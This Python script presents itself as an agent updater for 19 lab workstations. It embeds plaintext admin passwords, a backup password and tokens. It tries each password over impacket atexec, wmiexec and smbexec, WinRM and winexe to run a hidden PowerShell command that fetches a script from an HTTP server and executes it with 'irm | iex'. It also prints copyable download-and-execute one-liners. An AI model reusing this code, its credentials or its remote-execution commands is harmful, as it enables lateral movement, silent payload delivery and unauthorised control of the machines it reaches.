#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Workstation Manager - Обновление агентов для корпуса ЦК B4 (Ubuntu / Debian / Linux)
====================================================================================
Группы:
  - ЦК B4 / 5 этаж / 512 (5 ПК,  токен: wm_tok_2d20a75eef21e61d)
  - ЦК B4 / 5 этаж / 513 (12 ПК, токен: wm_tok_a78863fc5308e95e)
  - ЦК B4 / 5 этаж / 541 (2 ПК,  токен: wm_tok_4470ec159a499f5f)
Всего: 19 компьютеров
Учетные данные: admin / bmstu023 (резервный пароль: oitp507)
Сервер: http://172.19.33.68:2301
"""

import sys
import os
import socket
import subprocess
import time
import shutil
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

SERVER_URL = "http://172.19.33.68:2301"
ADMIN_USER = "admin"
PRIMARY_PASS = "bmstu023"
BACKUP_PASS = "oitp507"
PASSWORDS = [PRIMARY_PASS, BACKUP_PASS]

GROUPS = [
    {
        "name": "ЦК B4 / 5 этаж / 512",
        "token": "wm_tok_2d20a75eef21e61d",
        "broadcast": "172.16.47.255",
        "devices": [
            {"ip": "172.16.223.145", "name": "B4-512-15"},
            {"ip": "172.16.221.6",   "name": "B4-512-18"},
            {"ip": "172.16.45.217",  "name": "B4-512-01"},
            {"ip": "172.16.47.143",  "name": "B4-512-17"},
            {"ip": "172.16.46.58",   "name": "B4-512-28"},
        ]
    },
    {
        "name": "ЦК B4 / 5 этаж / 513",
        "token": "wm_tok_a78863fc5308e95e",
        "broadcast": "172.16.47.255",
        "devices": [
            {"ip": "172.16.45.14",   "name": "B4-513-01"},
            {"ip": "172.16.47.196",  "name": "B4-513-28"},
            {"ip": "172.16.47.121",  "name": "B4-513-09"},
            {"ip": "172.16.47.117",  "name": "B4-513-05"},
            {"ip": "172.16.47.49",   "name": "B4-513-02"},
            {"ip": "172.16.47.212",  "name": "B4-513-03"},
            {"ip": "172.16.45.197",  "name": "B4-513-21"},
            {"ip": "172.16.45.132",  "name": "B4-513-17"},
            {"ip": "172.16.46.86",   "name": "B4-513-10"},
            {"ip": "172.16.45.204",  "name": "B4-513-19"},
            {"ip": "172.16.47.228",  "name": "B4-513-16"},
            {"ip": "172.16.47.135",  "name": "B4-513-14"},
        ]
    },
    {
        "name": "ЦК B4 / 5 этаж / 541",
        "token": "wm_tok_4470ec159a499f5f",
        "broadcast": "172.16.47.255",
        "devices": [
            {"ip": "172.16.45.242",  "name": "B4-541-02"},
            {"ip": "172.16.47.122",  "name": "B4-541-01"},
        ]
    }
]

class Colors:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    GRAY = "\033[90m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

def print_header(subtitle=""):
    print(f"{Colors.CYAN}{'=' * 80}")
    print(f"   WORKSTATION MANAGER - ОБНОВЛЕНИЕ АГЕНТОВ (UBUNTU / LINUX)")
    print(f"   Корпус: ЦК B4 (512, 513, 541)")
    print(f"   Всего ПК: 19 станций | Учетные данные: {ADMIN_USER} / {PRIMARY_PASS}")
    if subtitle:
        print(f"   {subtitle}")
    print(f"{'=' * 80}{Colors.RESET}\n")

def test_tcp_port(ip, port, timeout=0.35):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        res = s.connect_ex((ip, port))
        s.close()
        return res == 0
    except Exception:
        return False

def ping_host(ip, timeout=1):
    param = "-n" if sys.platform.startswith("win") else "-c"
    timeout_param = "-w" if sys.platform.startswith("win") else "-W"
    try:
        cmd = ["ping", param, "1", timeout_param, str(timeout), ip]
        res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return res.returncode == 0
    except Exception:
        return False

def check_host_connectivity(dev):
    ip = dev["ip"]
    is_ping = ping_host(ip, timeout=1)
    p135 = test_tcp_port(ip, 135)
    p445 = test_tcp_port(ip, 445)
    p5985 = test_tcp_port(ip, 5985)
    p3389 = test_tcp_port(ip, 3389)
    online = is_ping or p135 or p445 or p5985 or p3389
    return {
        "dev": dev,
        "online": online,
        "ping": is_ping,
        "ports": {135: p135, 445: p445, 5985: p5985, 3389: p3389}
    }

def find_execution_backends():
    """Проверяет наличие утилит удаленного управления на Ubuntu"""
    backends = []
    # 1. Impacket tools
    for name in ["atexec.py", "impacket-atexec"]:
        if shutil.which(name):
            backends.append(("atexec", shutil.which(name)))
            break
    for name in ["wmiexec.py", "impacket-wmiexec"]:
        if shutil.which(name):
            backends.append(("wmiexec", shutil.which(name)))
            break
    for name in ["smbexec.py", "impacket-smbexec"]:
        if shutil.which(name):
            backends.append(("smbexec", shutil.which(name)))
            break

    # 2. PyWinRM module
    try:
        import winrm
        backends.append(("pywinrm", "python3-winrm"))
    except ImportError:
        pass

    # 3. Impacket python module
    try:
        import impacket
        backends.append(("impacket_lib", "python3-impacket"))
    except ImportError:
        pass

    # 4. Winexe
    if shutil.which("winexe"):
        backends.append(("winexe", shutil.which("winexe")))

    # 5. Samba net rpc
    if shutil.which("net"):
        backends.append(("net_rpc", shutil.which("net")))

    return backends

def install_dependencies():
    """Автоматическая установка impacket/pywinrm на Ubuntu"""
    print(f"\n{Colors.YELLOW}[*] Попытка автоматической установки impacket через apt / pip...{Colors.RESET}")
    # Попробуем apt-get
    if shutil.which("apt-get"):
        cmd = ["sudo", "apt-get", "update", "-y"]
        subprocess.run(cmd)
        cmd2 = ["sudo", "apt-get", "install", "-y", "python3-impacket", "python3-pip"]
        res = subprocess.run(cmd2)
        if res.returncode == 0:
            print(f"{Colors.GREEN}[+] python3-impacket успешно установлен через apt!{Colors.RESET}")
            return True

    # Попробуем pip3
    if shutil.which("pip3") or shutil.which("pip"):
        pip_cmd = "pip3" if shutil.which("pip3") else "pip"
        res = subprocess.run([pip_cmd, "install", "impacket", "pywinrm"])
        if res.returncode == 0:
            print(f"{Colors.GREEN}[+] impacket и pywinrm успешно установлены через pip!{Colors.RESET}")
            return True

    print(f"{Colors.RED}[!] Не удалось автоматически установить зависимости.{Colors.RESET}")
    print("    Выполните вручную: sudo apt update && sudo apt install -y python3-impacket")
    return False

def execute_remote_update(ip, token, backends):
    """Выполняет команду обновления на удаленном Windows ПК"""
    install_url = f"{SERVER_URL}/install.ps1?token={token}"
    ps_cmd = f"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"irm '{install_url}' | iex\""

    for password in PASSWORDS:
        # Вектор 1: atexec (Task Scheduler через RPC 445)
        for b_name, b_path in backends:
            if b_name == "atexec":
                try:
                    proc = subprocess.run(
                        [b_path, "-silentcommand", f"{ADMIN_USER}:{password}@{ip}", ps_cmd],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        timeout=7
                    )
                    out = (proc.stdout or "").strip()
                    if proc.returncode == 0 or "executed as" in out.lower() or "success" in out.lower():
                        return True, "SUCCESS_ATEXEC", f"Планировщик RPC ({ADMIN_USER})"
                except Exception:
                    pass

        # Вектор 2: wmiexec (WMI через RPC 135)
        for b_name, b_path in backends:
            if b_name == "wmiexec":
                try:
                    proc = subprocess.run(
                        [b_path, "-silentcommand", f"{ADMIN_USER}:{password}@{ip}", ps_cmd],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        timeout=7
                    )
                    out = (proc.stdout or "").strip()
                    if proc.returncode == 0 or "command executed" in out.lower():
                        return True, "SUCCESS_WMIEXEC", f"WMI Process ({ADMIN_USER})"
                except Exception:
                    pass

        # Вектор 3: smbexec (Service Control Manager через SMB 445)
        for b_name, b_path in backends:
            if b_name == "smbexec":
                try:
                    proc = subprocess.run(
                        [b_path, "-silentcommand", f"{ADMIN_USER}:{password}@{ip}", ps_cmd],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        timeout=7
                    )
                    out = (proc.stdout or "").strip()
                    if proc.returncode == 0 or "success" in out.lower():
                        return True, "SUCCESS_SMBEXEC", f"SC Manager SMB ({ADMIN_USER})"
                except Exception:
                    pass

        # Вектор 4: pywinrm (WinRM 5985)
        for b_name, _ in backends:
            if b_name == "pywinrm":
                try:
                    import winrm
                    sess = winrm.Session(ip, auth=(ADMIN_USER, password), transport='ntlm', server_cert_validation='ignore')
                    r = sess.run_cmd(ps_cmd)
                    if r.status_code == 0:
                        return True, "SUCCESS_WINRM", f"WinRM SOAP ({ADMIN_USER})"
                except Exception:
                    pass

        # Вектор 5: winexe
        for b_name, b_path in backends:
            if b_name == "winexe":
                try:
                    proc = subprocess.run(
                        [b_path, f"-U{ADMIN_USER}%{password}", f"//{ip}", ps_cmd],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        timeout=7
                    )
                    if proc.returncode == 0:
                        return True, "SUCCESS_WINEXE", f"Winexe ({ADMIN_USER})"
                except Exception:
                    pass

    return False, "EXEC_FAILED", "Все векторы отклонены (проверьте фаервол или доступ учетной записи)"

def run_wol():
    """Широковещательный Wake-on-LAN для подсетей ЦК"""
    print_header("ОТПРАВКА WAKE-ON-LAN (WoL)")
    subnets = ["172.16.45.255", "172.16.46.255", "172.16.47.255", "255.255.255.255"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    print(f"[*] Отправка широковещательных пакетов в подсети ЦК: {', '.join(subnets)}")
    for subnet in subnets:
        try:
            dummy_mac = b'\xff' * 6 + (b'\x00\x58\x3f\x1b\xf6\xb9') * 16
            sock.sendto(dummy_mac, (subnet, 9))
            sock.sendto(dummy_mac, (subnet, 7))
        except Exception:
            pass
    sock.close()
    print(f"{Colors.GREEN}[+] WoL сигналы отправлены! Компьютеры просыпаются...{Colors.RESET}")

def run_ping_check():
    """Проверка сетевой доступности всех 19 машин ЦК"""
    print_header("ПРОВЕРКА СВЯЗИ (PING И СЕТЕВЫЕ ПОРТЫ)")
    all_devs = []
    for g in GROUPS:
        for d in g["devices"]:
            all_devs.append((g["name"], d))

    print(f"[*] Сканирование {len(all_devs)} рабочих станций ЦК...\n")
    online_count = 0

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_host_connectivity, dev): (grp, dev) for grp, dev in all_devs}
        for future in as_completed(futures):
            grp, dev = futures[future]
            info = future.result()
            ip = dev["ip"]
            name = dev["name"]
            online = info["online"]
            if online:
                online_count += 1
                open_ports = [str(p) for p, is_open in info["ports"].items() if is_open]
                ports_str = f"порты: {','.join(open_ports)}" if open_ports else "только ICMP"
                status_str = f"{Colors.GREEN}[ ONLINE  ]{Colors.RESET}"
                print(f" {status_str} {ip:<15} | {name:<16} | {grp:<22} | {Colors.GRAY}{ports_str}{Colors.RESET}")
            else:
                status_str = f"{Colors.RED}[ OFFLINE ]{Colors.RESET}"
                print(f" {status_str} {ip:<15} | {name:<16} | {grp:<22} | нет ответа")

    print(f"\n{Colors.CYAN}Итог проверки: Доступно {online_count} из {len(all_devs)} ПК корпуса ЦК.{Colors.RESET}")

def run_fleet_update():
    """Полное обновление всех групп ЦК"""
    print_header("ЗАПУСК ОБНОВЛЕНИЯ АГЕНТОВ ВО ВСЕХ ГРУППАХ ЦК")

    backends = find_execution_backends()
    if not backends:
        print(f"{Colors.YELLOW}[!] В системе не обнаружены утилиты удаленного запуска (atexec / wmiexec / pywinrm).{Colors.RESET}")
        ans = input("Желаете установить impacket автоматически? [Y/n]: ").strip().lower()
        if ans in ["", "y", "yes", "д", "да"]:
            if install_dependencies():
                backends = find_execution_backends()
        if not backends:
            print(f"\n{Colors.RED}[!] Удаленный запуск невозможен без установленного impacket или pywinrm.{Colors.RESET}")
            print(f"    Установите вручную: {Colors.WHITE}sudo apt install -y python3-impacket{Colors.RESET}")
            print(f"    Либо используйте готовые однострочники (пункт 4 в меню).")
            return

    b_names = ", ".join([b[0] for b in backends])
    print(f"{Colors.GREEN}[+] Активные модули выполнения: {b_names}{Colors.RESET}")
    print(f"[*] Запуск процесса обновления (параллельно до 15 потоков)...\n")

    total_pcs = sum(len(g["devices"]) for g in GROUPS)
    success_count = 0
    offline_count = 0
    failed_count = 0

    for g in GROUPS:
        grp_name = g["name"]
        token = g["token"]
        devs = g["devices"]
        print(f"{Colors.YELLOW}>>> Группа: {grp_name} (Токен: {token}, ПК: {len(devs)}) <<<{Colors.RESET}")

        def update_single_pc(d):
            ip = d["ip"]
            name = d["name"]
            p_res = check_host_connectivity(d)
            if not p_res["online"]:
                return "OFFLINE", ip, name, "Хост недоступен по сети"

            ok, code, details = execute_remote_update(ip, token, backends)
            if ok:
                return "SUCCESS", ip, name, details
            else:
                return "FAILED", ip, name, details

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(update_single_pc, d) for d in devs]
            for f in as_completed(futures):
                status, ip, name, detail = f.result()
                if status == "SUCCESS":
                    success_count += 1
                    print(f"  {Colors.GREEN}[ УСПЕХ   ]{Colors.RESET} {ip:<15} | {name:<16} -> {detail}")
                elif status == "OFFLINE":
                    offline_count += 1
                    print(f"  {Colors.GRAY}[ OFFLINE ]{Colors.RESET} {ip:<15} | {name:<16} -> ПК выключен")
                else:
                    failed_count += 1
                    print(f"  {Colors.RED}[ ОШИБКА  ]{Colors.RESET} {ip:<15} | {name:<16} -> {detail}")

        print()

    print(f"{Colors.CYAN}{'=' * 80}")
    print(f"   ИТОГИ ОБНОВЛЕНИЯ КОРПУСА ЦК:")
    print(f"   - Успешно обновлено: {Colors.GREEN}{success_count}{Colors.CYAN} ПК")
    print(f"   - Выключено/не в сети: {Colors.GRAY}{offline_count}{Colors.CYAN} ПК")
    print(f"   - Ошибок доступа: {Colors.RED}{failed_count}{Colors.CYAN} ПК")
    print(f"{'=' * 80}{Colors.RESET}\n")

def show_oneliners():
    """Выводит готовые команды для ручного запуска в PowerShell"""
    print_header("ОДНОСТРОЧНИКИ ДЛЯ РУЧНОГО ЗАПУСКА НА КЛИЕНТАХ ЦК")
    print("Если требуется обновить конкретную машину вручную или через RDP,\nвыполните в PowerShell от имени Администратора:\n")
    for g in GROUPS:
        token = g["token"]
        print(f"{Colors.YELLOW}[ {g['name']} ]{Colors.RESET}")
        print(f"{Colors.WHITE}powershell.exe -ExecutionPolicy Bypass -Command \"irm '{SERVER_URL}/install.ps1?token={token}' | iex\"{Colors.RESET}\n")

def main():
    parser = argparse.ArgumentParser(description="Workstation Manager - Обновление агентов корпуса ЦК на Ubuntu")
    parser.add_argument("-a", "--all", action="store_true", help="Автоматически запустить обновление всех ПК")
    parser.add_argument("-p", "--ping", action="store_true", help="Только проверить сетевую доступность")
    parser.add_argument("-w", "--wol", action="store_true", help="Отправить Wake-on-LAN пакеты")
    parser.add_argument("-i", "--install", action="store_true", help="Установить зависимости (impacket/pywinrm)")
    args = parser.parse_args()

    if args.all:
        run_fleet_update()
        return
    if args.ping:
        run_ping_check()
        return
    if args.wol:
        run_wol()
        return
    if args.install:
        install_dependencies()
        return

    # Интерактивное меню
    while True:
        os.system("clear" if os.name != "nt" else "cls")
        print_header()
        print(" Выберите действие:")
        print(f"   {Colors.GREEN}[1]{Colors.RESET} Запустить удаленное обновление агентов ЦК (19 ПК) {Colors.GRAY}(по умолчанию){Colors.RESET}")
        print(f"   {Colors.CYAN}[2]{Colors.RESET} Проверить сетевую доступность (Ping и порты 135/445/5985)")
        print(f"   {Colors.YELLOW}[3]{Colors.RESET} Разбудить выключенные ПК через Wake-on-LAN (WoL)")
        print(f"   {Colors.WHITE}[4]{Colors.RESET} Показать однострочники PowerShell для ручного запуска")
        print(f"   {Colors.RED}[Q]{Colors.RESET} Выход\n")

        choice = input(f"Ваш выбор [1, 2, 3, 4, Q] (Enter = 1): ").strip().upper()
        if choice in ["", "1"]:
            run_fleet_update()
            input("\nНажмите Enter для возврата в меню...")
        elif choice == "2":
            run_ping_check()
            input("\nНажмите Enter для возврата в меню...")
        elif choice == "3":
            run_wol()
            input("\nНажмите Enter для возврата в меню...")
        elif choice == "4":
            show_oneliners()
            input("\nНажмите Enter для возврата в меню...")
        elif choice == "Q":
            print("\nВыход из программы.")
            break

if __name__ == "__main__":
    main()
